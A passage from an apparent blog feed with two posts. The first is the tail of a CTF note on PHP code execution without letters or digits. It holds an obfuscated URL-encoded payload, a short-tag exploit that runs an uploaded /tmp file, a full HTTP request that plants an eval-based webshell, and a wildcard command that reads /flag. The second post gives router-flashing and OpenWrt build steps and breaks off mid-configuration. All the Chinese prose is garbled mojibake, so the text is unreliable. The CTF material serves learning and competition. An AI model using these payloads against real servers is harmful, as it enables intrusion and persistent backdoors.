operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">2</span>b<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">.</span><span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span>__<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">3</span>d<span class="token operator">%</span><span class="token number">24</span><span class="token operator">%</span><span class="token number">24</span>____<span class="token operator">%</span><span class="token number">3</span>b<span class="token operator">%</span><span class="token number">24</span>___<span class="token punctuation">(</span><span class="token operator">%</span><span class="token number">24</span>_<span class="token operator">%</span><span class="token number">5</span>b_<span class="token operator">%</span><span class="token number">5</span>d<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">3</span>b</span></code></pre><p>æ³¨æ„è¿™ä¸¤ä¸ªpayloadåˆ©ç”¨çš„è¯è¦phpç‰ˆæœ¬å°äº7æ‰èƒ½æˆåŠŸåˆ©ç”¨ï¼Œ</p><blockquote><p>php5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡<code>$f=&#39;assert&#39;;$f(...);</code>è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚</p><p>ä½†php7ä¸­ï¼Œ<code>assert</code>ä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼<code>eval</code>ï¼‰ï¼Œä¸èƒ½å†ä½œä¸ºå‡½æ•°ååŠ¨æ€æ‰§è¡Œä»£ç ï¼Œæ‰€ä»¥åˆ©ç”¨èµ·æ¥ç¨å¾®å¤æ‚ä¸€ç‚¹ã€‚ä½†ä¹Ÿæ— éœ€è¿‡äºæ‹…å¿ƒï¼Œæ¯”å¦‚æˆ‘ä»¬åˆ©ç”¨<code>file_put_contents</code>å‡½æ•°ï¼ŒåŒæ ·å¯ä»¥ç”¨æ¥<code>getshell</code>ã€‚</p></blockquote><p>æµ‹è¯•ç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p><h3 id="çŸ­æ ‡ç­¾"><a href="#çŸ­æ ‡ç­¾" class="headerlink" title="çŸ­æ ‡ç­¾"></a>çŸ­æ ‡ç­¾</h3><p>PHPä¸­æœ‰ä¸¤ç§çŸ­æ ‡ç­¾ï¼Œ<code>&lt;??&gt;</code>å’Œ<code>&lt;?=?&gt;</code>ã€‚å…¶ä¸­ï¼Œ<code>&lt;??&gt;</code>ç›¸å½“äºå¯¹<code>&lt;?php&gt;</code>çš„æ›¿æ¢ã€‚è€Œ<code>&lt;?=?&gt;</code>åˆ™æ˜¯ç›¸å½“äº<code>&lt;? echo&gt;</code>.</p><p>ä¾‹å¦‚ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string single-quoted-string">'whoami'</span><span class="token delimiter important">?></span></span>  //è¾“å‡º  whoami<span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`whoami`</span><span class="token delimiter important">?></span></span>  //è¾“å‡º  å‘½ä»¤æ‰§è¡Œåçš„ç»“æœ</code></pre><p>PHPä¸­POSTä¸Šä¼ æ–‡ä»¶ä¼šæŠŠæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶æš‚æ—¶å­˜åœ¨<code>/tmp</code>æ–‡ä»¶å¤¹ä¸­ï¼Œé»˜è®¤æ–‡ä»¶åæ˜¯<code>/tmp/phpXXXXXX</code>ï¼Œæ–‡ä»¶åæœ€å6ä¸ªå­—ç¬¦æ˜¯éšæœºçš„å¤§å°å†™å­—æ¯ã€‚</p><p>å°è¯•ç”Ÿæˆæ‰§è¡Œçš„æ–‡ä»¶ï¼Œpayloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">.</span> <span class="token operator">/</span><span class="token operator">??</span><span class="token operator">?</span><span class="token operator">/</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token operator">??</span><span class="token punctuation">[</span>@<span class="token operator">-</span><span class="token punctuation">[</span><span class="token punctuation">]</span></code></pre><p>æœ€åçš„<code>[@-[]</code>è¡¨ç¤ºASCIIåœ¨<code>@</code>å’Œ<code>[</code>ä¹‹é—´çš„å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯å¤§å†™å­—æ¯ï¼Œæ‰€ä»¥æœ€åä¼šæ‰§è¡Œçš„æ–‡ä»¶æ˜¯<code>tmp</code>æ–‡ä»¶å¤¹ä¸‹ç»“å°¾æ˜¯å¤§å†™å­—æ¯çš„æ–‡ä»¶ã€‚</p><p>expæ•°æ®åŒ…</p><pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/?exp=?>&lt;?=`.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]`%3b?></span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header-name keyword">Host:</span> xxxxxx:2333<span class="token header-name keyword">User-Agent:</span> Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="token header-name keyword">Content-Type:</span>multipart/form-data;boundary=--------123<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Upgrade-Insecure-Requests:</span> 1<span class="token header-name keyword">Content-Length:</span> 106----------123<span class="token header-name keyword">Content-Disposition:</span>form-data;name="file";filename="1.txt"echo "&lt;?php eval(\$_POST['shell']);" > success.php----------123--</code></pre><p>å³å¯<code>getshell</code></p><p>æ‹¿<code>flag</code>çš„è¯è¿˜å¯ä»¥ä½¿ç”¨é€šé…ç¬¦</p><pre class="language-php" data-language="php"><code class="language-php">code=?><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token string backtick-quoted-string">`/???/??? /????`</span><span class="token delimiter important">?></span></span></code></pre><p>å…¶ä¸­<code>/???/??? /????</code>åŒ¹é…<code>/bin/cat /flag</code>ï¼Œè¿™æ ·ä¹Ÿèƒ½å¾—åˆ°<code>flag</code></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a></li><li><a href="https://xz.aliyun.com/t/7181">é€šè¿‡ä¸€é“ä»£ç å®¡è®¡é¢˜ç›®æ¥ç»ƒä¹ æ— æ•°å­—å­—æ¯æ„é€ webshell</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></li><li><a href="https://xz.aliyun.com/t/8107">æ— å­—æ¯æ•°å­—webshellæ€»ç»“</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTFæœ‰æ—¶ä¼šç¢°åˆ°è¿™ç§ç±»å‹é¢˜ï¼Œæ•…åœ¨è¿™é‡Œæ€»ç»“ä¸€ä¸‹ï¼Œæ—¥åæœ‰æ–°çš„æ“ä½œå†è¡¥ä¸Š&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åˆ©ç”¨æ¡ä»¶&lt;/strong&gt;ï¼š&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é™åˆ¶æ¡ä»¶&lt;/strong&gt;ï¼š&lt;code&gt;preg_match(&amp;#39;[a-z0-9]/is&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="å¤‡å¿˜å½•" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTFé¢˜" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>è·¯ç”±å™¨æŠ˜è…¾å°è®°</title>
    <link href="https://www.extrader.top/posts/4704f692/"/>
    <id>https://www.extrader.top/posts/4704f692/</id>
    <published>2020-08-06T04:27:18.000Z</published>
    <updated>2020-08-08T13:32:13.301Z</updated>
    
    <content type="html"><![CDATA[<p>æœ¬æ–‡è®°å½•æˆ‘ï¼ˆçº¯å°ç™½ï¼‰è¿™å‡ å¤©æŠ˜è…¾è·¯ç”±å™¨çš„å¤§è‡´è¿‡ç¨‹ï¼Œå¤‡å¿˜ç”¨</p><h4 id="ç‰©è‰²è·¯ç”±å™¨"><a href="#ç‰©è‰²è·¯ç”±å™¨" class="headerlink" title="ç‰©è‰²è·¯ç”±å™¨"></a>ç‰©è‰²è·¯ç”±å™¨</h4><p>å› ä¸ºä»æ¥æ²¡ç©è¿‡ï¼Œè€Œä¸”å®¶é‡Œå¥½å‡ å¹´å‰çš„è·¯ç”±å™¨æ˜¯æ—¶å€™æ”¹æ¢äº†ï¼Œäºæ˜¯å°±å‡†å¤‡æ¢å°ï¼Œå½“åˆåªæ˜¯å•çº¯çš„æƒ³æ¢å°è·¯ç”±å™¨æå‡æå‡å®¶é‡Œçš„WiFiä¿¡å·çš„ç½‘é€Ÿï¼Œéƒ½å·²ç»åœ¨jdä¸Šé€‰å¥½äº†ä¸€å°æ°´æ˜Ÿçš„ï¼Œä½†å› ä¸ºä¸€ç›´åœ¨å­¦æ ¡è¿Ÿè¿Ÿæ²¡æœ‰ä¹°ï¼Œåæ¥å‘ç°äº†è·¯ç”±å™¨çš„å„ç§ç©æ³•ï¼Œåˆ·å›ºä»¶fqï¼Œè§£é”æŸäº‘ç°è‰²musicä¹‹ç±»çš„ï¼Œå°±å¼€å§‹åœ¨ç½‘ä¸Šå„ç§èµ„æ–™å’Œå›ºä»¶ï¼Œä¹Ÿæ…¢æ…¢çš„åœ¨ç‰©è‰²ä¸€æ¬¾è·¯ç”±å™¨ï¼ˆåŸæ¥é€‰ä¸­çš„æ°´æ˜Ÿçš„é‚£ä¸ªç½‘ä¸Šèµ„æ–™å°‘ï¼Œå®˜æ–¹å¥½åƒä¸æ”¯æŒå›ºä»¶åˆ‡æ¢ï¼‰ï¼Œä¸€ç›´åœ¨å°ç±³å’Œnewifi3ä¹‹é—´å¾˜å¾Šï¼Œæœ€åé€‰æ‹©äº†è”æƒ³çš„newifi3ï¼Œç»“æœæ— çº¿ç¿»è½¦äº†ï¼Œç°åœ¨åæ‚”äº†å½“æ—¶ä¸ºä»€ä¹ˆæ²¡æœ‰çœ‹åˆ°k2pï¼Œâ”­â”®ï¹â”­â”®ï¼Œæ— çº¿ä¿¡å·æ˜¯çœŸçš„å·®ï¼Œåˆ·äº†openwrtåå±…ç„¶èµ¶ä¸ä¸Šæˆ‘å®¶åŸæ¥çš„è€è·¯ç”±å™¨ï¼Œå¿ƒæ€ç‚¸äº†ã€‚ã€‚ã€‚</p><p>ä½†æ˜¯ã€‚ã€‚ã€‚ç‚¸å½’ç‚¸ï¼Œç”¨è¿˜æ˜¯æœ‰ç”¨çš„ï¼Œè™½ç„¶æ— çº¿ä¸å’‹åœ°ï¼Œå½“å…¶ä»–æ–¹é¢ç”¨ç”¨å¯ä»¥çš„ï¼Œæ”¯æŒusbï¼Œ512Mçš„å†…å­˜</p><h4 id="åˆ·ä¸æ­»breed"><a href="#åˆ·ä¸æ­»breed" class="headerlink" title="åˆ·ä¸æ­»breed"></a>åˆ·ä¸æ­»breed</h4><p>å…ˆä¸‹å¥½ä¸æ­»breedå›ºä»¶ï¼Œè¿™ä¸ªç½‘ä¸Šå¾ˆå¤š</p><p>ç„¶åæœ¬åœ°æ­ä¸€ä¸ªwebæœåŠ¡å™¨ï¼ŒæŠŠæ–‡ä»¶æ”¾ä¸Šé¢ï¼Œç„¶ååœ¨è·¯ç”±å™¨ç»ˆç«¯äº†é‡Œå°±å¯ä»¥ç”¨wgetä¸‹è½½äº†</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> root@192.168.99.1<span class="token builtin class-name">cd</span> /tmp<span class="token function">wget</span> http://xxx.xxx.xxx.xxx/newifi-d2-jail-break.koinsmod newifi-d2-jail-break.ko</code></pre><p>éšåSSH ä¼šåœæ­¢å“åº”ï¼Œå› ä¸º newifi-d2-jail-break.ko ä¼šå†»ç»“ç³»ç»Ÿçš„å…¶ä»–åŠŸèƒ½ï¼Œå¼ºåˆ¶å†™å…¥ Newifi D2 ä¸“ç”¨ç‰ˆ Breed åˆ° Flash</p><p>ç„¶åæŠŠè·¯ç”±å™¨ç”µæºæ‹”äº†ä¹‹åæŒ‰ä½resetæŒ‰é’®å†æ’ä¸Šç”µæºç›´åˆ°åªæœ‰ç”µæºç­‰å¼€å§‹é—ªçƒå†æ¾å¼€ç”µæºï¼Œæµè§ˆå™¨è¾“å…¥192.168.1.1å³å¯è¿›å…¥breed webç®¡ç†ç•Œé¢ï¼Œå†åœ¨è¿™é‡Œé¢å°†åŸæ¥çš„eepromå’Œç¼–ç¨‹å™¨å¤‡ä»½ä¸€ä¸‹ï¼Œå†åˆ·å…¥è‡ªå·±æƒ³è¦çš„ç¬¬ä¸‰æ–¹å›ºä»¶ï¼ˆbinæ–‡ä»¶ï¼‰</p><p>åˆ·è¿™ä¸ªbreedçš„åŸå› æ˜¯å› ä¸ºæˆ‘ä»¬åœ¨åˆ·ç¬¬ä¸‰æ–¹å›ºä»¶çš„æ—¶å€™å¦‚æœæ²¡æ“ä½œå¥½ï¼Œå›ºä»¶åˆ‡æ¢å‡ºäº†å·®é”™çš„è¯ï¼Œè·¯ç”±å™¨å°±å˜ç –äº†ï¼Œä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå°±æœ‰å¤§ç¥åšå‡ºäº†è¿™ä¸ªbreedï¼Œç›¸å½“äºä¸€ä¸ªubootå¼•å¯¼åŠ è½½ç¨‹åº</p><h4 id="åˆ·ç¬¬ä¸‰æ–¹å›ºä»¶"><a href="#åˆ·ç¬¬ä¸‰æ–¹å›ºä»¶" class="headerlink" title="åˆ·ç¬¬ä¸‰æ–¹å›ºä»¶"></a>åˆ·ç¬¬ä¸‰æ–¹å›ºä»¶</h4><p>è¿™é‡Œæˆ‘è¯•äº†å¥½å‡ ä¸ªï¼Œæœ€åé€‰æ‹©äº†esirå¤§ç¥çš„openwrtå›ºä»¶ï¼Œè¿™é‡Œå¯ä»¥ä¸‹è½½ï¼š <a href="https://openwrt.club/dl">https://openwrt.club/dl</a> </p><p>é€‰æ‹©é‡Œé¢çš„<code>openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin</code>æ–‡ä»¶åˆ·å…¥åç­‰å¾…è·¯ç”±å™¨é‡å¯ï¼Œé‡å¯å®Œæˆåè¾“å…¥192.168.1.1å³å¯è¿›å…¥openwrtç®¡ç†ç•Œé¢</p><h4 id="åˆ·openclash"><a href="#åˆ·openclash" class="headerlink" title="åˆ·openclash"></a>åˆ·openclash</h4><p>ä¸‹è½½åœ°å€ <a href="https://github.com/vernesong/OpenClash/releases">https://github.com/vernesong/OpenClash/releases</a></p><p>ä¸‹å¥½ipkæ–‡ä»¶ï¼Œsshè¿ä¸Šè·¯ç”±å™¨ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp opkg updateopkg <span class="token function">install</span> coreutils-nohup <span class="token function">bash</span> iptables dnsmasq-full <span class="token function">curl</span> jsonfilter ca-certificates ipset ip-full iptables-mod-tproxy<span class="token function">wget</span> https://github.com/vernesong/OpenClash/releases/download/v0.39.6-beta/luci-app-openclash_0.39.6-beta_all.ipkopkg <span class="token function">install</span> luci-app-openclash_0.39.6-beta_all.ipk</code></pre><p>ç„¶ååˆ·æ–°ä¸€ä¸‹é¡µé¢å°±å¯ä»¥åœ¨æœåŠ¡é‡Œé¢çœ‹åˆ°openclashäº†ï¼Œå‰©ä¸‹çš„é…ç½®å·¥ä½œå°±è¦è‡ªå·±æ“ä½œäº†</p><p>å¦å¤–è¿™ä¸ªç‰ˆæœ¬çš„è‡ªå¸¦è§£é”ç½‘æ˜“äº‘ç°è‰²éŸ³ä¹çš„åŠŸèƒ½ï¼Œç›´æ¥å¼€å¯å°±å¯ä»¥äº†</p><h4 id="è‡ªå·±ç¼–è¯‘openwrt"><a href="#è‡ªå·±ç¼–è¯‘openwrt" class="headerlink" title="è‡ªå·±ç¼–è¯‘openwrt"></a>è‡ªå·±ç¼–è¯‘openwrt</h4><p>æ³¨æ„ï¼š</p><ol><li><strong>ä¸</strong>è¦ç”¨ <strong>root</strong> ç”¨æˆ·æ¥ git å’Œç¼–è¯‘ï¼ï¼ï¼</li><li>å›½å†…ç”¨æˆ·ç¼–è¯‘å‰æœ€å¥½å‡†å¤‡å¥½æ¢¯å­</li><li>é»˜è®¤ç™»é™†IP 192.168.1.1, å¯†ç  password</li></ol><p>éœ€è¦Ubuntu 18 LTS x64ç¯å¢ƒ</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> -y <span class="token function">install</span> build-essential asciidoc binutils <span class="token function">bzip2</span> <span class="token function">gawk</span> gettext <span class="token function">git</span> libncurses5-dev libz-dev patch python3.5 python2.7 <span class="token function">unzip</span> zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf</code></pre><p>ç„¶åä¸‹è½½openwrtçš„æºä»£ç </p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/Lienol/openwrt<span class="token builtin class-name">cd</span> openwrt/package<span class="token function">git</span> clone https://github.com/kenzok8/openwrt-packages.git<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>./scripts/feeds clean./scripts/feeds update -a./scripts/feeds <span class="token function">install</span> -a<span class="token function">make</span> menuconfig</code></pre><p>ç„¶åå°±æ˜¯é…ç½®ç¼–è¯‘é€‰é¡¹äº†</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">å¦‚æœæ˜¯newifi3åˆ™ï¼šTarget Systemé€‰æ‹© <span class="token string">"MediaTek Ralink MIPS"</span>Subtargeté€‰æ‹©<span class="token 